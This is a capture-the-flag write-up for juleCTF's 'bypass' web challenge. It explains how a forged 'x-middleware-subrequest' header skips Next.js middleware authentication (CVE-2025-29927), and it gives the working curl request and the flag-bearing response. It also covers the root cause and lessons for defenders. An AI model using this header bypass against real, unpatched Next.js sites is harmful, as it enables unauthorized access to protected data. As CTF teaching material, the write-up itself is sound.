# Bypass - juleCTF Challenge Writeup

**Challenge Name:** bypass  
**Author:** ciphr  
**Category:** Web Security  
**URL:** <https://bypass.julec.tf>
**Description:** Can you bypass security and access Santa's packet database?

---

## Overview

This challenge exploits a critical authorization bypass vulnerability in Next.js middleware configurations, specifically related to how Next.js handles internal subrequests. The vulnerability was disclosed by ProjectDiscovery and affects Next.js applications that rely on middleware for authentication/authorization.

## Challenge Analysis

### Application Structure

The application is a Next.js web app with the following key components:

1. **Public Homepage** (`/`) - Accessible to everyone, displays information about Santa's packet database
2. **Protected Route** (`/protected`) - Should be restricted, contains the flag in Santa's secret packet list
3. **Middleware** - Implements authentication check

### Middleware Implementation

```typescript
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

const isAuthenticated = false

export function middleware(request: NextRequest) {
  if (request.nextUrl.pathname.startsWith('/protected')) {
    if (!isAuthenticated) {
      console.log('Auth failed - redirecting to /')      
      return NextResponse.redirect(new URL('/', request.url))
    }
  }
  return NextResponse.next()
}

export const config = {
  matcher: ['/protected/:path*'],
}
```

The middleware checks if users are authenticated before allowing access to `/protected` routes. Since `isAuthenticated` is hardcoded to `false`, normal access always redirects to the homepage.

### The Vulnerability

Next.js middleware has a critical flaw: it doesn't run on **internal subrequests**. When Next.js makes internal routing decisions or handles certain types of requests marked with specific headers, the middleware can be completely bypassed.

The vulnerability is documented in detail at:

- <https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass>
- CVE-2025-29927 (as referenced in the flag)

Key points:

- Next.js uses the `x-middleware-subrequest` header to identify internal routing requests
- Middleware is skipped when this header is present
- Attackers can manually add this header to bypass middleware authentication checks

## Exploitation

### The Attack

To bypass the authentication middleware and access the protected route, we simply need to add the `x-middleware-subrequest` header to our request:

```bash
curl -k "https://bypass.julec.tf/protected" -H "x-middleware-subrequest: middleware"
```

### Why This Works

1. The middleware checks for authentication on `/protected` routes
2. However, when the `x-middleware-subrequest` header is present, Next.js treats it as an internal request
3. Internal requests skip middleware execution entirely
4. The request goes directly to the protected page without authentication checks
5. The flag is rendered in the response

### Response

The curl command returns the full HTML page including Santa's packet database with the flag embedded:

```html
<code>
    Candy Cane Care Packet (Peppermint candy canes, Hot cocoa sachet and Mini marshmallows)<br/>
    Cozy Winter Warmth Packet (Fuzzy Christmas socks, Hot cider mix and Cinnamon-scented candle)<br/>
    Santa's Secret Packet (Small wooden toy, JUL{wAtcH_oUt_foR_MIDDLEWARE_BYPASS__CVE-2025-29927} and Elf-approved-glue)<br/>
    Reindeer Snack Packet (Carrot gummies, A tiny sleigh bell and Feeding instructions signed by Rudolph)<br/>
</code>
```

The flag is located in the "Santa's Secret Packet" line and includes a reference to CVE-2025-29927.

## Flag

```
JUL{wAtcH_oUt_foR_MIDDLEWARE_BYPASS__CVE-2025-29927}
```

## Vulnerability Details

### Root Cause

The vulnerability exists because:

1. Next.js middleware was designed to skip execution for internal framework requests
2. The framework uses `x-middleware-subrequest` to identify these internal requests
3. There's no validation that the header actually came from an internal Next.js operation
4. Attackers can forge this header to mimic internal requests

### Impact

- Complete authentication/authorization bypass
- Access to any route "protected" by middleware
- Exposure of sensitive data and functionality
- Affects any Next.js application relying solely on middleware for security

## Tools Used

- `curl` - Command-line HTTP client
- Browser DevTools (optional) - For inspection

## Learning Points

1. **Never trust client-controllable headers** for security decisions
2. **Middleware limitations** - Understand framework-specific bypass techniques
3. **Defense in depth** - Multiple security layers prevent single points of failure
4. **Framework internals** - Understanding how frameworks route requests reveals attack vectors
5. **Security headers** - Headers intended for internal use can become attack vectors if not properly validated

## References

- [ProjectDiscovery: Next.js Middleware Authorization Bypass](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)
- [Next.js Middleware Documentation](https://nextjs.org/docs/app/building-your-application/routing/middleware)
- Challenge URL: <https://bypass.julec.tf>

---

**Writeup by:** Jonathan  
**Date:** December 4, 2025  
**CTF:** juleCTF  
**Difficulty:** Medium
